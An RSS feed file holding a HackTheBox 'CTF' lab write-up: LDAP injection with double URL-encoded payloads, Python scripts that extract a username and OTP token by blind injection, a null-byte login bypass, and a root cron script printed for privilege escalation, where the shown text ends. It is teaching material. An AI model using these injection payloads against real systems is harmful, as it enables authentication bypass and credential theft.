@@ -1,0 +1,3112 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>squ4r00t</title>
+    <link>//localhost:1313/</link>
+    <description>Recent content on squ4r00t</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 30 Apr 2025 00:00:00 +0000</lastBuildDate><atom:link href="//localhost:1313/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HTB - CTF</title>
+      <link>//localhost:1313/posts/htb-ctf/</link>
+      <pubDate>Wed, 30 Apr 2025 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/posts/htb-ctf/</guid>
+      <description>&lt;blockquote&gt;
+&lt;p&gt;CTF is an insane difficulty Linux box with a web application using LDAP based authentication. The application is vulnerable to LDAP injection but due to character blacklisting the payloads need to be double URL encoded. After enumeration, a token string is found, which is obtained using boolean injection. Using the token an OTP can be generated, which allows for execution of commands. After establishing a foothold, a cron can be exploited to gain sensitive information.&lt;/p&gt;</description>
+      <content>&lt;blockquote&gt;
+&lt;p&gt;CTF is an insane difficulty Linux box with a web application using LDAP based authentication. The application is vulnerable to LDAP injection but due to character blacklisting the payloads need to be double URL encoded. After enumeration, a token string is found, which is obtained using boolean injection. Using the token an OTP can be generated, which allows for execution of commands. After establishing a foothold, a cron can be exploited to gain sensitive information.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;port-scan-results&#34;&gt;Port Scan Results&lt;/h2&gt;
+&lt;hr&gt;
+&lt;p&gt;From the results of the nmap scan, we see that we have 2 ports open: 22 and 80&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT   STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| ssh-hostkey:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|   2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|   256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_  256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;80/tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| http-methods:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_  Potentially risky methods: TRACE
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_http-title: CTF
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;website&#34;&gt;Website&lt;/h2&gt;
+&lt;hr&gt;
+&lt;p&gt;Navigating to &lt;code&gt;http://10.10.10.122&lt;/code&gt;, we get this page telling us about a token-based (software tokens specifically) authentication system to be tested:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/homepage.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Home Page&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We are also informed that bruteforcing attempts may result in a 5 minute ban. Banned ip will be available at &lt;code&gt;/status.php&lt;/code&gt;:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/status.php.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;List of banned IPs&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We have a login page at &lt;code&gt;/login.php&lt;/code&gt;:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/loginpage.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Login page&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;If we try basic credentials such as &lt;code&gt;admin:1234&lt;/code&gt;, we get the following response:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/admin_not_found.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Response for admin:1234&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Looking at the source page, we see the following comment under the OTP input field:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/source_page_comment.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Comment in the login page source&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Knowing that the token string is stored in an &amp;ldquo;attribute&amp;rdquo;, we can make the assumption that the authentication system is based on LDAP.&lt;/p&gt;
+&lt;h3 id=&#34;testing-for-ldap-injection&#34;&gt;Testing for LDAP Injection&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;Testing for LDAP Injection would help us validate our hypothesis that the website is using LDAP and potentially bypass the authentication system.&lt;/p&gt;
+&lt;p&gt;First, we can try to send characters that are specific to LDAP&amp;rsquo;s syntax. For example, the &lt;code&gt;*&lt;/code&gt; (wilcard) character:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/wc_char_noenc.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Sending the * character with no encoding&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Sending the &lt;code&gt;*&lt;/code&gt; character does not return any error message. This indicates that some characters are maybe filtered before reaching the application logic.&lt;/p&gt;
+&lt;p&gt;If that&amp;rsquo;s the case we can try URL-encoding them:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/wc_char_enc1.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;* character URL-encoded once&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/wc_char_enc2.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;* character double URL-encoded&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;When we double URL-encoded our payload, we got a different response: &amp;ldquo;Cannot login&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;Earlier, when we tried admin we got the response: &amp;ldquo;User admin not found&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;This means we got a valid user by using the &lt;code&gt;*&lt;/code&gt; character. Knowing this, and leveraging the difference between the 2 responses, we can retrieve a username character by character.&lt;/p&gt;
+&lt;h3 id=&#34;username-enumeration&#34;&gt;Username enumeration&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;This is how we&amp;rsquo;ll retrieve the username:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;First we send &lt;code&gt;a*&lt;/code&gt; as the username. If we get the message &amp;ldquo;Cannot login&amp;rdquo;, then we know that the first letter is &amp;lsquo;a&amp;rsquo;. If we don&amp;rsquo;t, we move on to the letter &amp;lsquo;b&amp;rsquo; by sending &lt;code&gt;b*&lt;/code&gt;, so on and so forth.&lt;/li&gt;
+&lt;li&gt;Let&amp;rsquo;s say that we confirmed that the first letter is &amp;lsquo;a&amp;rsquo;. Now we repeat the process for the second letter by sending &lt;code&gt;aa*&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;We repeat this process until we get the full username.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;For this, we can use this python script:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;198732546&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;198732546&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Retrieving the username through LDAP Injection&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
+import requests
+import string
+import time
+
+letters = list(string.ascii_lowercase)
+url = &amp;#39;http://10.10.10.122/login.php&amp;#39;
+
+def guess_next_char(current_guessed_string):
+    for letter in letters:
+        time.sleep(0.3)
+        data = {
+            &amp;#34;inputUsername&amp;#34;: f&amp;#34;{current_guessed_string}{letter}%2a&amp;#34;,
+            &amp;#34;inputOTP&amp;#34;: &amp;#34;1234&amp;#34;,
+        }
+        response = requests.post(url, data=data)
+        if &amp;#34;Cannot login&amp;#34; in response.text:
+            return letter
+
+    print(&amp;#34;END&amp;#34;)
+    exit(1)
+
+username = &amp;#34;&amp;#34;
+while True:
+    username &amp;#43;= guess_next_char(username)
+    print(username)
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/ldapuser_guess.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Script running&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;The script returned the username &lt;code&gt;ldapuser&lt;/code&gt;. We can confirm it by trying it on the login page:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/confirm_ldapuser.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Confirmation&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Now that we have a valid username, we need to know the OTP.&lt;/p&gt;
+&lt;p&gt;Referring to the comment we found earlier, the token is stored in one of the attribute. However we don&amp;rsquo;t know which one that is. We can use the LDAP injection in order to fuzz for different attributes and see which one contains the token.&lt;/p&gt;
+&lt;h3 id=&#34;attribute-enumeration&#34;&gt;Attribute enumeration&lt;/h3&gt;
+&lt;p&gt;We can use &lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_attributes.txt&#34;&gt;this LDAP attributes wordlist&lt;/a&gt; from PayloadsAllTheThings:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;c
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cn
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;co
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;commonName
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dc
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;facsimileTelephoneNumber
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;givenName
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gn
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;homePhone
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;id
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;jpegPhoto
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;l
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mail
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mobile
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;name
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;o
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;objectClass
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ou
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;owner
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pager
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;password
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sn
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;st
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;surname
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;uid
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;username
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;userPassword
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Assuming that the LDAP logic in the backend looks like the following:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;734258619&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;734258619&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;ldap&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Hypothetical query&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-ldap&#34; &gt;&lt;code&gt;
+(&amp;amp;
+  (username=&amp;lt;USERINPUT&amp;gt;)
+  (otp=&amp;lt;USERINPUT&amp;gt;)
+)
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;We can try to breakout of one of the conditions and add our own which will contain the attribute we are testing the existence of.&lt;/p&gt;
+&lt;p&gt;This can be done by sending something like &lt;code&gt;ldapuser)(attribute=*&lt;/code&gt; as the username (double URL-encoded).&lt;/p&gt;
+&lt;p&gt;This will then result in the following &amp;ldquo;hypothetical&amp;rdquo; query:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;195873624&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;195873624&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;ldap&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Resulting query&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-ldap&#34; &gt;&lt;code&gt;
+(&amp;amp;
+  (username=ldapuser)
+  (attribute=*)
+  (otp=&amp;lt;USERINPUT&amp;gt;)
+)
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;If the attribute doesn&amp;rsquo;t exist we won&amp;rsquo;t get the &amp;ldquo;Cannot login&amp;rdquo; error message.&lt;/p&gt;
+&lt;p&gt;Using burp intruder, we can fuzz every attribute in our wordlist and see for which ones we get &amp;ldquo;Cannot login&amp;rdquo; in the response&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/attribute_fuzzing_intruder.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Setting up Burp Intruder&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/valid_attributes.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Valid LDAP attributes&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Among this list of valid attributes, &lt;code&gt;pager&lt;/code&gt; seems to be a good candidate for containing a 81 digits token. We can verify it by using the same method as we did in the username enumeration.&lt;/p&gt;
+&lt;h3 id=&#34;token-leak&#34;&gt;Token leak&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;We can use a slightly modified version of the previous script:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;652814397&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;652814397&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Retrieving the token string through LDAP Injection&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
+import requests
+import string
+import time
+
+letters = list(string.ascii_lowercase)
+digits = [int(d) for d in &amp;#34;1234567890&amp;#34;]
+url = &amp;#39;http://10.10.10.122/login.php&amp;#39;
+
+def guess_next_char(current_guessed_string):
+    for digit in digits:
+        time.sleep(0.3)
+        data = {
+            &amp;#34;inputUsername&amp;#34;: f&amp;#34;ldapuser%29%28pager%3d{current_guessed_string}{digit}%2a&amp;#34;,
+            &amp;#34;inputOTP&amp;#34;: &amp;#34;1234&amp;#34;,
+        }
+        response = requests.post(url, data=data)
+        if &amp;#34;Cannot login&amp;#34; in response.text:
+            return str(digit)
+
+    print(&amp;#34;END&amp;#34;)
+    exit(1)
+
+token = &amp;#34;&amp;#34;
+while True:
+    token &amp;#43;= guess_next_char(token)
+    print(token)
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/token_brute_start.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Start of the attack&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/token_brute_end.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Brute Force finished&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h3 id=&#34;otp-generation&#34;&gt;OTP Generation&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;From the token we obtained previously, we need to generate a valid OTP which we can use to login. For this we can use  the command line tool: &lt;code&gt;stoken&lt;/code&gt; (It was mentionned on the home page that the authentication was based on &lt;a href=&#34;https://manpages.ubuntu.com/manpages/focal/man1/stoken.1.html&#34;&gt;Software Tokens&lt;/a&gt;)&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Before running the tool, we need to make sure that our clock is synchronized with the server&amp;rsquo;s or use a time offset&lt;/p&gt;&lt;/blockquote&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;956187432&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;956187432&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Generating OTP&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+stoken --token=285449490011372370317401734215712056720371131272577450204172154164546722716756524 --pin=0000
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;After submitting the login request with the generated OTP, we are redirected to the following page &lt;code&gt;/page.php&lt;/code&gt;:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/page.php.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;/page.php&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h3 id=&#34;command-execution&#34;&gt;Command execution&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;If we try to run a command, we receive this error message:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/cmd_error_message.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Cannot run commands&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;This is means that there is a group membership check that is done. So in order to execute commands we&amp;rsquo;ll either have to get access to a more privileged account or somehow bypass the group membership check.&lt;/p&gt;
+&lt;p&gt;We can try to do the latter by injecting a NULL byte (&lt;code&gt;0x00&lt;/code&gt;) character after closing the ldap query.&lt;/p&gt;
+&lt;p&gt;For that we&amp;rsquo;ll first send &lt;code&gt;ldapuser)%00&lt;/code&gt; as the username and increase the number of parenthesis until we close the query.&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/null_byte_1.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;With 1 parenthesis&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/null_byte_2.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;With 2 parenthesis&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/null_byte_3.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;With 3 parenthesis&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;So we need 3 parenthesis to close the query. Now, we can try to login with &lt;code&gt;ldapuser)))%00&lt;/code&gt; and a valid OTP and see if we bypass the group membership check.&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/null_byte_login.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Login with null byte injection&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We logged in successfully with the null byte injection.&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/run_cmd_id.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Running the &#39;id&#39; command&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Now we are able to run commands, we can therefore get a reverse shell:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/revshell_cmd.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Executing the reverse shell&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/revshell_caught.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Catching the reverse shell&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h2 id=&#34;privesc&#34;&gt;Privesc&lt;/h2&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;apache---ldapuser&#34;&gt;apache -&amp;gt; ldapuser&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;Looking at the files of the website, we find credentials for &lt;code&gt;ldapuser&lt;/code&gt; in &lt;code&gt;/var/www/html/login.php&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/img/htb/ctf/ldapuser_creds.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We can use them to login as &lt;code&gt;ldapuser&lt;/code&gt; via ssh and retrieve the user flag:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/img/htb/ctf/user.txt.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;ldapuser---root&#34;&gt;ldapuser -&amp;gt; root&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;Under &lt;code&gt;/backup&lt;/code&gt;, we can see different archives with timestamps in their name. Looking at the last modified date, we see they are each separated by a minute.&lt;/p&gt;
+&lt;p&gt;This indicates that there might be a cron job running every minute.&lt;/p&gt;
+&lt;p&gt;We also have a &lt;code&gt;error.log&lt;/code&gt; file running every minute which is empty. And a bash script called &lt;code&gt;honeypot.sh&lt;/code&gt;:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;695348721&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;695348721&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;honeypot.sh&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+# get banned ips from fail2ban jails and update banned.txt
+# banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)
+/usr/sbin/ipset list | grep fail2ban -A 7 | grep -E &amp;#39;[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}&amp;#39; | sort -u &amp;gt; /var/www/html/banned.txt
+# awk &amp;#39;$1=$1&amp;#39; ORS=&amp;#39;&amp;lt;br&amp;gt;&amp;#39; /var/www/html/banned.txt &amp;gt; /var/www/html/testfile.tmp &amp;amp;&amp;amp; mv /var/www/html/testfile.tmp /var/www/html/banned.txt
+
+# some vars in order to be sure that backups are protected
+now=$(date &amp;#43;&amp;#34;%s&amp;#34;)
+filename=&amp;#34;backup.$now&amp;#34;
+pass=$(openssl passwd -1 -salt 0xEA31 -in /root/root.txt | md5sum | awk &amp;#39;{print $1}&amp;#39;)
+
+# keep only last 10 backups
+cd /backup
+ls -1t *.zip | tail -n &amp;#43;11 | xargs rm -f
+
+# get the files from the honeypot and backup &amp;#39;em all
+cd /var/www/html/uploads
+7za a /backup/$filename.zip -t7z -snl -p$pass -- *
+
+# cleaup the honeypot
+rm -rf -- *
+
+# comment the next line to get errors for debugging
+truncate -s 0 /backup/error.log
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
